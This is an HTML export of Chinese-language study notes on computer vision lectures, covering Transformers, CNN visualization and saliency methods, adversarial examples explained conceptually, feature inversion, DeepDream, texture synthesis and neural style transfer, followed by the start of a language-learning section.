<h4 id="note-cs-cv-lec17-multi-head-self-attention">Multi-head Self-attention<a class="headerlink" href="#note-cs-cv-lec17-multi-head-self-attention" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec17-11.png" width="90%&quot;" />

<figcaption>
Multi-head Self-attention
</figcaption>
</figure>
<p>将输入向量分成多个子空间，每个子空间称为一个“头”。每个头独立执行自注意力计算，捕获不同的特征和关系。</p>
<p>步骤：</p>
<ul>
<li>
<p>将输入向量 <span class="arithmatex">\( \mathbf{X} \)</span> 分割成多个部分，每个部分对应一个注意力头。</p>
</li>
<li>
<p>每个头独立计算自注意力，包括生成查询、键和值向量，计算相似度，应用 softmax，生成输出。</p>
</li>
<li>
<p>将所有头的输出连接（concat）在一起。</p>
</li>
<li>
<p>对连接后的输出进行线性投影，生成最终的输出。</p>
</li>
<li>
<p>多头机制允许模型在不同的子空间中关注不同的特征，增强了模型的表达能力。</p>
</li>
<li>
<p>通过并行计算提高了效率。</p>
</li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><figure markdown="span">
 <img alt="" src="../NOTE/CS/CV/img/lec17-12.png" width="90%&quot;" />
<figcaption>
CNN with Self-attention
</figcaption>
</figure></p>
<blockquote>
<p>最后通过 1×1 卷积将加权求和的结果转换回原始通道数 <span class="arithmatex">\(C\)</span>。</p>
</blockquote>
<p><figure markdown="span">
<img alt="" src="../NOTE/CS/CV/img/lec17-13.png" width="90%&quot;" />
<figcaption>
Three ways of Processing Sqs
</figcaption>
</figure></p>
</div>
<h2 id="note-cs-cv-lec17-transformer">Transformer<a class="headerlink" href="#note-cs-cv-lec17-transformer" title="Permanent link">&para;</a></h2>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec17-14.png" width="90%&quot;" />

<figcaption>
Transformer Block
</figcaption>
</figure>
<p>包括自注意力机制、前馈神经网络和层归一化。</p>
<ul>
<li>
<p>输入向量 <span class="arithmatex">\( x_1, x_2, x_3, x_4 \)</span> 是经过嵌入处理的输入数据。</p>
</li>
<li>
<p>计算输入向量之间的相似度，生成注意力权重。</p>
</li>
<li>
<p>使用注意力权重对输入进行加权求和，捕获全局依赖关系。</p>
</li>
<li>
<p>自注意力的输出与输入相加（残差连接），然后进行层归一化，稳定训练过程。</p>
</li>
</ul>
<p><strong>前馈神经网络（MLP）</strong>：</p>
<ul>
<li>每个位置的向量通过一个小型的前馈神经网络（通常包含两个线性变换和一个激活函数，如 ReLU）。</li>
<li>这种结构增强了模型的非线性表达能力。</li>
</ul>
<p><strong>第二个残差连接和层归一化</strong>：
- 前馈网络的输出与自注意力层的输出相加，再进行层归一化。</p>
<p><strong>输出</strong>：
- 最终输出 <span class="arithmatex">\( y_1, y_2, y_3, y_4 \)</span> 是经过自注意力和前馈网络处理后的结果。</p>
<h3 id="note-cs-cv-lec17-pre-norm-transformer">Pre-norm Transformer<a class="headerlink" href="#note-cs-cv-lec17-pre-norm-transformer" title="Permanent link">&para;</a></h3>
<p>上面的结构称为Post-norm Transformer，其在残差连接之后进行层归一化。在深层网络中可能导致训练不稳定。</p>
<p>Pre-norm Transformer 在残差连接之前进行层归一化。更稳定，适合更深的网络。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec17-15.png" width="90%&quot;" />

<figcaption>
Pre-norm Transformer
</figcaption>
</figure></section><section class="print-page" id="note-cs-cv-lec21" heading-number="2.4.5.14"><h1 id="note-cs-cv-lec21-visualizing-and-generating">Visualizing and Generating<a class="headerlink" href="#note-cs-cv-lec21-visualizing-and-generating" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 4749 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 19 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 16 分钟</p>
</div>
<h2 id="note-cs-cv-lec21-visualizing-and-understanding-convolutional-networks">Visualizing and Understanding Convolutional Networks<a class="headerlink" href="#note-cs-cv-lec21-visualizing-and-understanding-convolutional-networks" title="Permanent link">&para;</a></h2>
<p>卷积神经网络的第一层的filters主要学习的是边缘特征</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-1.png" width="70%&quot;" />

<figcaption>
    Visualizing the filters of the first layer of a convolutional network
</figcaption>
</figure>
<p>因为第一层filters的通道数和输入的通道数相同，所以可以将其可视化。为各种边边角角的组合。</p>
<p>但是越往后，filters的通道数就比较奇怪，例如20x16x7x7，将其作为RGB图像可视化没有什么意义，可以将其看作是20组，每组16个7x7的特征灰度图。但是即使这样，看起来也并不像任何东西。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-2.png" width="70%&quot;" />
</figure>
<p>由于最后一层在全连接层之前是一个大向量，例如4096维；可以将各种图像应用在训练好的网络中，根据这个大的特征向量使用nearest neighbor的方法找到最相似的向量，然后将它们的图像匹配在一起；</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-3.png" width="70%&quot;" />
</figure>
<p>与linear classifier使用像素不同，在这个特征向量上使用最近邻的结果表现得非常好，这说明神经网络通过学习，消除了图像本身的一些特征，例如光照，位置，角度等，提取出了更高层次的特征；</p>
<p>还可以通过Dimension Reduction的方法将4096维的特征向量降维到2维的点，然后将对应的点替换为图像，就可以得到图像在空间上的分布；</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-4.png" width="70%&quot;" />
</figure>
<blockquote>
<p><a href="https://cs.stanford.edu/people/karpathy/cnnembed/">高清图</a></p>
</blockquote>
<p>可以看到相似的图像都紧凑地聚集在一起，而不同的图像则分散在各个角落。</p>
<h3 id="note-cs-cv-lec21-visualizing-the-activations">Visualizing the activations<a class="headerlink" href="#note-cs-cv-lec21-visualizing-the-activations" title="Permanent link">&para;</a></h3>
<p>还可以通过中间层的特征来可视化图像</p>
<p>例如conv5是128x13x13的，可以将其看作是128个13x13的特征图，可以将其可视化，在下面这个例子中，其中一个特征图可视化后非常像人脸，说明这个特征图学习到了人脸的特征。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-5.png" width="70%&quot;" />
</figure>
<h4 id="note-cs-cv-lec21-maximally-activating-patches">Maximally Activating Patches<a class="headerlink" href="#note-cs-cv-lec21-maximally-activating-patches" title="Permanent link">&para;</a></h4>
<p>最大激活补丁（Maximally Activating Patches）是指在卷积神经网络中，选择一个特定的层和通道，然后输入大量图像，记录该通道的激活值，最后可视化那些产生最大激活值的图像补丁。</p>
<p>工作流程如下：</p>
<ul>
<li>选择网络中的一个特定层和通道，例如conv5层（尺寸为128×13×13），可以选择其中的第17个通道</li>
<li>将大量图像输入网络，记录所选通道的激活值</li>
<li>可视化那些产生最大激活值的图像补丁</li>
</ul>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-6.png" width="70%&quot;" />
</figure>
<p>这种可视化方法揭示了卷积神经网络中不同通道学习识别的具体视觉特征。通过查看最大激活补丁，我们可以理解每个通道在"寻找"什么样的图像特征，从而解释网络如何进行特征提取。这表明神经网络的不同部分专门负责检测图像中的不同语义元素，进一步证实了深度学习模型具有层次化特征学习能力。</p>
<h4 id="note-cs-cv-lec21-saliency-via-occlusion">Saliency Via Occlusion<a class="headerlink" href="#note-cs-cv-lec21-saliency-via-occlusion" title="Permanent link">&para;</a></h4>
<p>遮挡显著性(Saliency via Occlusion)是一种确定图像中哪些区域对CNN预测最重要的方法。其基本思想是通过系统地遮挡图像的不同部分，然后观察模型预测概率的变化，来判断哪些区域对分类结果影响最大。</p>
<p>工作流程如下：</p>
<ul>
<li>使用滑动窗口方法，用灰色方块（或其他颜色）系统地遮挡输入图像的不同区域</li>
<li>每次遮挡后，将修改后的图像输入CNN，记录预测概率的变化</li>
<li>生成热力图，显示遮挡每个区域后导致的预测概率下降程度</li>
</ul>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-7.png" width="70%&quot;" />

<figcaption>
    使用遮挡技术可视化CNN中重要的像素区域
</figcaption>
</figure>
<p>如上图所示，右侧的热力图显示了对每个类别（帆船、非洲象、卡丁车）的预测贡献最大的区域。热力图中的亮色区域表示该区域被遮挡后会导致预测概率大幅下降，说明这些区域对模型的决策至关重要。</p>
<p>这种方法直观地展示了CNN在做决策时"关注"图像的哪些部分，有助于我们理解模型的工作原理并验证其是否真正学习到了有意义的特征，而不是依赖于图像中的无关背景或伪相关。</p>
<h4 id="note-cs-cv-lec21-saliency-via-backpropagation">Saliency via Backpropagation<a class="headerlink" href="#note-cs-cv-lec21-saliency-via-backpropagation" title="Permanent link">&para;</a></h4>
<p>反向传播显著性(Saliency via Backpropagation)是一种通过反向传播梯度来确定图像中哪些区域对CNN预测结果影响最大的方法。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-8.png" width="70%&quot;" />
</figure>
<p>具体实现步骤：</p>
<ul>
<li>将图像输入网络，进行前向传播，得到类别预测分数</li>
<li>计算特定类别（如"狗"）的未归一化分数相对于输入图像像素的梯度</li>
<li>取梯度的绝对值，并在RGB通道上取最大值</li>
<li>生成可视化热力图，显示哪些像素对预测结果贡献最大</li>
</ul>
<p>这种方法的优势在于计算效率高，只需一次反向传播即可获得显著性图，而且能直接揭示网络关注的图像区域。与遮挡方法相比，它不需要进行多次前向传播，因此速度更快。</p>
<p>通过这种可视化技术，我们可以验证CNN是否真正关注目标对象的相关特征，而非背景或无关元素，有助于解释模型决策过程并检测潜在的偏见或过拟合问题。</p>
<h4 id="note-cs-cv-lec21-intermediate-features-via-guided-backpropagation">Intermediate Features via Guided Backpropagation<a class="headerlink" href="#note-cs-cv-lec21-intermediate-features-via-guided-backpropagation" title="Permanent link">&para;</a></h4>
<p>引导反向传播(Guided Backpropagation)是对标准反向传播方法的一种改进，用于更好地可视化CNN中间层神经元所关注的图像区域。</p>
<p>工作流程如下：</p>
<ul>
<li>选择网络中特定的一个中间神经元（例如conv5层128×13×13特征图中的一个值）</li>
<li>计算该神经元的激活值相对于输入图像像素的梯度</li>
<li>但与标准反向传播不同，引导反向传播在反向传递中对ReLU激活函数进行特殊处理</li>
</ul>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-9.png" width="70%&quot;" />
</figure>
<p>引导反向传播的特点：</p>
<ul>
<li>在反向传播过程中，仅允许正梯度通过ReLU层（"引导"过程）</li>
<li>这意味着在ReLU层，同时考虑前向传播和反向传播的限制：</li>
<li>前向传播时，只有正值会被传递（ReLU的标准行为）</li>
<li>
<p>反向传播时，只有正梯度会被传递（引导部分）</p>
</li>
<li>
<p>结果产生更清晰的可视化，更好地展示了神经元响应的图像区域</p>
</li>
</ul>
<p>这种方法相比普通反向传播可以生成更加锐利和聚焦的可视化结果，使我们能够更清楚地了解CNN中特定神经元对应的图像特征。从右侧的比较可以看出，引导反向传播的结果更加清晰，噪声更少。</p>
<p>这项技术最早由Springenberg等人在2015年的ICLR研讨会论文"Striving for Simplicity: The All Convolutional Net"中提出，它为理解CNN内部表示提供了重要工具。</p>
<h4 id="note-cs-cv-lec21-class-activation-mapping">Class Activation Mapping<a class="headerlink" href="#note-cs-cv-lec21-class-activation-mapping" title="Permanent link">&para;</a></h4>
<p>类激活映射(Class Activation Mapping)是一种用于可视化卷积神经网络中特定类别的激活区域的方法。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-10.png" width="70%&quot;" />
</figure>
<p>首先，对CNN提取出的图像(H,W,K)特征进行全局平均池化(K,)，得到一个特征向量，然后通过全连接层得到一个类别得分(C,)。</p>
<p>由于平均池化：</p>
<div class="arithmatex">\[
    F_k = \frac{1}{HW}\sum_{h,w}f_{h,w,k}
\]</div>
<p>将其带入每个类别的得分中:</p>
<div class="arithmatex">\[
S_c = \sum_k w_{k,c}F_k = \frac{1}{HW}\sum_k w_{k,c}\sum_{h,w}f_{h,w,k} = \frac{1}{HW}\sum_{h,w}\sum_k w_{k,c}f_{h,w,k}
\]</div>
<p>这样就得到了CAM的公式：</p>
<div class="arithmatex">\[
    M_{c,h,w} = \sum_k w_{k,c}f_{h,w,k}
\]</div>
<p>即，对于类别c，其在位置(h,w)的激活值是权重矩阵中第c列和特征图f按k通道进行内积的结果。</p>
<p>这种方式可以直观展示图像中对分类决策起关键作用的区域。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-11.png" width="70%&quot;" />
</figure>
<blockquote>
<p>但缺点是只能在最后的全连接层进行，如果想要在中间层进行，需要使用Grad-CAM。</p>
</blockquote>
<h2 id="note-cs-cv-lec21-generating-images">Generating Images<a class="headerlink" href="#note-cs-cv-lec21-generating-images" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-cv-lec21-gardient-ascent">Gardient Ascent<a class="headerlink" href="#note-cs-cv-lec21-gardient-ascent" title="Permanent link">&para;</a></h3>
<p>在之前，图像是固定的，我们通过反向传播来查看哪些像素的变化对于某个中间神经元的影响最大，来查看中间层通道在学习什么特征；</p>
<p>现在，我们可以从零开始，聚焦在中间层某一个神经元的值，不断通过梯度上升，来生成使得神经元激活值最大的图像。</p>
<p>总的来说，是重复执行以下步骤：</p>
<ul>
<li>前向传播，计算当前得分</li>
<li>反向传播，计算得分对于像素的梯度</li>
<li>更新图像，使得得分上升</li>
</ul>
<p>目标是</p>
<div class="arithmatex">\[
    argmax_I S_c(I) - \lambda ||I||_2^2
\]</div>
<p>需要添加正则项，防止其生成得分很高但是没有意义的图像。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-12.png" width="70%&quot;" />
</figure>
<p>通过多面特征，可以生成更加多样化的图像。</p>
<h3 id="note-cs-cv-lec21-adversarial-attack">Adversarial Attack<a class="headerlink" href="#note-cs-cv-lec21-adversarial-attack" title="Permanent link">&para;</a></h3>
<p>对抗样本（Adversarial Examples）是通过对输入数据进行微小但有目的的修改，以欺骗机器学习模型的技术</p>
<h4 id="note-cs-cv-lec21-start-from-arbitrary-image">Start from arbitrary image<a class="headerlink" href="#note-cs-cv-lec21-start-from-arbitrary-image" title="Permanent link">&para;</a></h4>
<p>对抗样本的生成可以从任何图像出发，包括自然图像（如照片）或随机噪声。关键是通过后续步骤对图像进行修改，使其被模型错误分类。例如：  </p>
<ul>
<li>若原始图像是“猫”，攻击者可能希望模型将其误判为“狗”或其他类别。  </li>
<li>起始图像的选择会影响生成对抗样本所需的扰动大小和复杂度。</li>
</ul>
<h4 id="note-cs-cv-lec21-select-a-target-class">Select a target class<a class="headerlink" href="#note-cs-cv-lec21-select-a-target-class" title="Permanent link">&para;</a></h4>
<p>攻击者需指定希望模型误判的类别（如“飞机”或“汽车”）。这一步决定了对抗样本的生成方向： </p>
<ul>
<li>定向攻击（Targeted Attack）：强制模型输出特定目标类别。  </li>
<li>非定向攻击（Untargeted Attack）：仅需让模型输出错误类别，不指定具体目标。<br />
目标类别的选择会影响生成对抗样本的策略和扰动模式。</li>
</ul>
<h4 id="note-cs-cv-lec21-gradient-ascent">gradient ascent<a class="headerlink" href="#note-cs-cv-lec21-gradient-ascent" title="Permanent link">&para;</a></h4>
<p>这是生成对抗样本的核心步骤，具体流程如下：  </p>
<ul>
<li>
<p>计算梯度：利用反向传播，计算模型对输入图像的梯度。梯度表示“如何调整图像像素值才能最大程度提高目标类别的预测概率”。  </p>
</li>
<li>
<p>梯度上升（Gradient Ascent）：与训练模型的梯度下降相反，梯度上升沿着梯度方向更新图像，逐步增加目标类别的分数。  </p>
</li>
</ul>
<h4 id="note-cs-cv-lec21-stop-condition">Stop condition<a class="headerlink" href="#note-cs-cv-lec21-stop-condition" title="Permanent link">&para;</a></h4>
<p>停止条件通常有两种：  </p>
<ul>
<li>置信度阈值：当目标类别的预测概率达到预设值（如99%）。  </li>
<li>扰动限制：当添加的扰动（如L2范数）超过允许范围，确保扰动对人类不可见。  </li>
</ul>
<p>例如，当原始图像被修改后，模型以高置信度将其分类为“飞机”而非真实的“猫”，则认为攻击成功。</p>
<h4 id="note-cs-cv-lec21-key-characteristics">Key characteristics<a class="headerlink" href="#note-cs-cv-lec21-key-characteristics" title="Permanent link">&para;</a></h4>
<ul>
<li>微小扰动：人类难以察觉的微小修改即可欺骗模型。  </li>
<li>可转移性：针对某模型生成的对抗样本，可能对其他模型也有效。  </li>
<li>高维敏感性：模型在高维特征空间中对微小扰动高度敏感。</li>
</ul>
<p>在自动驾驶、人脸识别等安全关键系统中，对抗样本可能导致严重错误。研究其生成与防御对提升AI系统的安全性和可靠性至关重要。</p>
<p>例如</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-13.png" width="70%&quot;" />
</figure>
<blockquote>
<p>通过微小的调整，就足以让其误判，但是人眼难以察觉。</p>
</blockquote>
<h4 id="note-cs-cv-lec21-white-box-attack">White-Box Attack<a class="headerlink" href="#note-cs-cv-lec21-white-box-attack" title="Permanent link">&para;</a></h4>
<p>白盒攻击（White-Box Attack）是指攻击者拥有目标模型的完整信息，包括模型结构、参数和训练数据。</p>
<h4 id="note-cs-cv-lec21-black-box-attack">Black-Box Attack<a class="headerlink" href="#note-cs-cv-lec21-black-box-attack" title="Permanent link">&para;</a></h4>
<p>黑盒攻击（Black-Box Attack）是指攻击者没有目标模型的完整信息，只能通过模型预测结果进行攻击。</p>
<h3 id="note-cs-cv-lec21-feature-inversion">Feature Inversion<a class="headerlink" href="#note-cs-cv-lec21-feature-inversion" title="Permanent link">&para;</a></h3>
<p>特征反转（Feature Inversion）是一种用于生成特定特征的图像的技术;</p>
<p>Feature Inversion（特征逆变换）是计算机视觉中一种用于 <strong>从神经网络的特征表示重建原始图像</strong> 的技术，通过逆向生成与特定特征匹配的图像，可以直观分析网络对输入数据的抽象表示能力。</p>
<ul>
<li>目标：给定某层特征图（如CNN中间层的输出），生成一张新图像，使其通过网络前传后在该层的特征尽可能接近目标特征。</li>
<li>本质：通过优化输入图像，最小化生成图像与目标特征之间的差异，从而反推网络“认为”什么样的输入会激活该特征。</li>
</ul>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-14.png" width="70%&quot;" />
</figure>
<p>可以看到，越往后，特征越抽象，越难以理解。</p>
<div class="arithmatex">\[
\mathbf{x}^* = \underset{\mathbf{x} \in \mathbb{R}^{H \times W \times C}}{\text{argmin}} \, \ell(\Phi(\mathbf{x}), \Phi_0) + \lambda \mathcal{R}(\mathbf{x})
\]</div>
<p>其中，特征匹配的损失函数定义为：</p>
<div class="arithmatex">\[
\ell(\Phi(\mathbf{x}), \Phi_0) = \|\Phi(\mathbf{x}) - \Phi_0\|^2
\]</div>
<div class="arithmatex">\[
\mathcal{R}_{V^\beta}(\mathbf{x}) = \sum_{i,j} \left( (x_{i,j+1} - x_{i,j})^2 + (x_{i+1,j} - x_{i,j})^2 \right)^{\frac{\beta}{2}}
\]</div>
<p>通过最小化网络特征表示与目标特征之间的差异，同时加入正则化项以获得视觉上更合理的结果。</p>
<h3 id="note-cs-cv-lec21-deepdream">DeepDream<a class="headerlink" href="#note-cs-cv-lec21-deepdream" title="Permanent link">&para;</a></h3>
<p>DeepDream是一种基于深度学习的图像生成技术，通过神经网络的中间层特征来生成具有艺术风格的图像。</p>
<p>即，比起生成图像，更像是特征的放大。</p>
<p>其流程是，首先，选择一张图像，然后选择一个想要放大特征的层</p>
<ul>
<li>Forward： 计算选定层的特征激活值</li>
<li>Set gradient of chosen layer equal to its activation</li>
<li>Backward： 计算梯度</li>
<li>Update： 更新图像</li>
</ul>
<p>通过将梯度设置为等于激活值，DeepDream算法实际上是在鼓励网络增强它已经检测到的特征。这是因为梯度通常指示如何改变输入以增加某个值，所以当梯度等于激活值时，这意味着我们希望增加已经存在的特征。</p>
<p>这一步创造了一个反馈循环，使得图像中的特定模式越来越明显。网络检测到某个特征，然后通过梯度下降（实际上是梯度上升，因为我们想要最大化激活）来增强该特征，然后在下一次迭代中，网络可能会检测到更强的同一特征，进一步增强它，依此类推。</p>
<p>普通的梯度上升通常是为了最大化某个特定类别的分数（如在对抗样本生成中）。而在DeepDream中，我们不关心特定类别，而是希望最大化选定层的整体激活，无论它们代表什么。通过将梯度设为激活值，我们实质上是说"给我更多已经存在的东西"。</p>
<p>此时不再关注它到底属于什么类别，只在乎增强已经存在的特征。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-15.png" width="70%&quot;" />
</figure>
<p>这会生成很魔幻的图像</p>
<h3 id="note-cs-cv-lec21-texture-synthesis">Texture Synthesis<a class="headerlink" href="#note-cs-cv-lec21-texture-synthesis" title="Permanent link">&para;</a></h3>
<p>纹理合成（Texture Synthesis）是一种基于深度学习的图像生成技术，通过学习图像的纹理特征，生成具有相似纹理的图像。</p>
<h4 id="note-cs-cv-lec21-nearest-neighbor">Nearest Neighbor<a class="headerlink" href="#note-cs-cv-lec21-nearest-neighbor" title="Permanent link">&para;</a></h4>
<p>生成顺序是扫描线顺序，也就是逐行逐个生成像素。对于每一个待生成的像素，查看其周围的已生成像素（可能是左方、上方以及左上方的像素，因为扫描线顺序下右边的和下方的像素还未生成），组成一个邻域。然后，在输入的样本纹理中寻找与该邻域最匹配的位置，然后将该位置对应的下一个像素复制到当前生成的位置。</p>
<h4 id="note-cs-cv-lec21-gram-matrix">Gram Matrix<a class="headerlink" href="#note-cs-cv-lec21-gram-matrix" title="Permanent link">&para;</a></h4>
<p>Gram矩阵是用于描述图像纹理特征的矩阵。</p>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>给定一组向量 <span class="arithmatex">\( \{\mathbf{v}_1, \mathbf{v}_2, \dots, \mathbf{v}_n\} \)</span>，Gram Matrix <span class="arithmatex">\( G \)</span> 是一个 <span class="arithmatex">\( n \times n \)</span> 的矩阵，其中每个元素 <span class="arithmatex">\( G_{i,j} \)</span> 是向量 <span class="arithmatex">\( \mathbf{v}_i \)</span> 和 <span class="arithmatex">\( \mathbf{v}_j \)</span> 的内积：</p>
<div class="arithmatex">\[
    G_{i,j} = \mathbf{v}_i \cdot \mathbf{v}_j
\]</div>
<p>每一层的卷积神经网络（CNN）都会生成一个形状为 C x H x W 的特征张量；即 H x W 的网格，每个网格包含一个 C 维的向量</p>
<p><figure markdown="span">
<img alt="" src="../NOTE/CS/CV/img/lec21-16.png" width="70%&quot;" />
</figure></p>
<p>在这里，Gram Matrix 的维度是 CxC，每个位置就是对应通道特征图的内积；</p>
<p>即，将每个通道的特征图展平为向量，得到矩阵 <span class="arithmatex">\( F_{\text{flat}} \in \mathbb{R}^{C \times (H \times W)} \)</span>。</p>
<p>然后计算Gram Matrix：</p>
<div class="arithmatex">\[
G = F_{\text{flat}} \cdot F_{\text{flat}}^\top \in \mathbb{R}^{C \times C}
\]</div>
<p>其中 <span class="arithmatex">\( G_{i,j} \)</span> 表示第 <span class="arithmatex">\( i \)</span> 个通道与第 <span class="arithmatex">\( j \)</span> 个通道在所有空间位置上的相关性。</p>
</div>
<p>Gram Matrix 编码了不同通道特征之间的 <strong>协方差</strong> ，反映哪些特征倾向于同时激活。通过展平特征图，Gram Matrix 仅保留通道间的统计特性，更适合表示全局风格（如纹理、颜色分布）。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-17.png" width="70%&quot;" />
</figure>
<p>通过Gram Matrix生成纹理图像的步骤：</p>
<p><strong>预训练CNN模型</strong>：</p>
<ul>
<li>使用在ImageNet上预训练好的CNN模型（如VGG-19）作为特征提取器</li>
</ul>
<p><strong>提取原始纹理特征</strong>：</p>
<ul>
<li>将原始纹理图像输入CNN</li>
<li>
<p>记录CNN各层的激活值（特征图）</p>
</li>
<li>
<p>每一层的特征表示为 <span class="arithmatex">\(\mathbf{F}^l \in \mathbb{R}^{C_l \times H_l \times W_l}\)</span></p>
</li>
</ul>
<p><strong>计算原始纹理的Gram矩阵</strong>：</p>
<ul>
<li>对每一层的特征图计算Gram矩阵</li>
<li>Gram矩阵计算公式：<span class="arithmatex">\(G^l_{c,c'} = \sum_{h,w} F^l_{c,h,w} F^l_{c',h,w}\)</span></li>
</ul>
<p><strong>初始化生成图像</strong>：</p>
<ul>
<li>从随机噪声开始（通常是白噪声）</li>
</ul>
<p><strong>迭代优化过程</strong>：</p>
<ul>
<li>将当前生成的图像输入CNN</li>
<li>计算生成图像在各层的特征图和Gram矩阵</li>
</ul>
<p><strong>计算损失函数</strong>：</p>
<ul>
<li>计算生成图像与原始纹理图像在各层Gram矩阵之间的L2距离</li>
<li>损失函数：<span class="arithmatex">\(E_l = \frac{1}{4N_l^2M_l^2} \sum_{c,c'} (G^l_{c,c'} - G'^l_{c,c'})^2\)</span></li>
<li>总损失：<span class="arithmatex">\(L = \sum_l w_l E_l\)</span>，其中 <span class="arithmatex">\(w_l\)</span> 是每层的权重</li>
</ul>
<p><strong>梯度下降更新</strong>：</p>
<ul>
<li>通过反向传播计算损失函数对生成图像的梯度</li>
<li>根据梯度更新生成图像</li>
</ul>
<p><strong>重复迭代</strong>：</p>
<ul>
<li>重复步骤5-7，直到生成图像稳定或达到预设迭代次数</li>
</ul>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-18.png" width="70%&quot;" />
</figure>
<p>从更高层重建纹理可以恢复输入纹理中的较大特征</p>
<h3 id="note-cs-cv-lec21-neural-style-transfer">Neural Style Transfer<a class="headerlink" href="#note-cs-cv-lec21-neural-style-transfer" title="Permanent link">&para;</a></h3>
<p>神经风格迁移（Neural Style Transfer）是一种基于深度学习的图像生成技术，通过将内容图像和风格图像的特征进行融合，生成具有艺术风格的图像。</p>
<p>有两个输入，一个是内容图像(content image)，一个是风格图像(style image)。</p>
<p>将特征与内容图像进行匹配，将Gram Matrix与风格图像进行匹配，然后进行优化，使得生成图像既具有内容图像的内容，又具有风格图像的风格。</p>
<p>即同时结合feature reconstruction和texture synthesis。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec21-19.png" width="70%&quot;" />
</figure>
<p>通过调整两者结合的权重，可以生成不同风格的图像，更加写实还是更加抽象。</p></section></section>
                    <section class='print-page md-section' id='section-2-4-6' heading-number='2.4.6'>
                        <h1>语言学习<a class='headerlink' href='#section-2-4-6' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note-language" heading-number="2.4.6.1"><h1 id="note-language-_1">外语学习<a class="headerlink" href="#note-language-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 28 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间不到 1 分钟</p>
</div>
<p>这里存放一些外语学习笔记，虽然目前只有英语。</p>
<ul>
<li><a href="https://qwerty.kaiyi.cool/">在线练习</a></li>
</ul></section><section class="print-page" id="note-language-english" heading-number="2.4.6.2"><h1 id="note-language-english-cet6-words">CET6 Words<a class="headerlink" href="#note-language-english-cet6-words" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
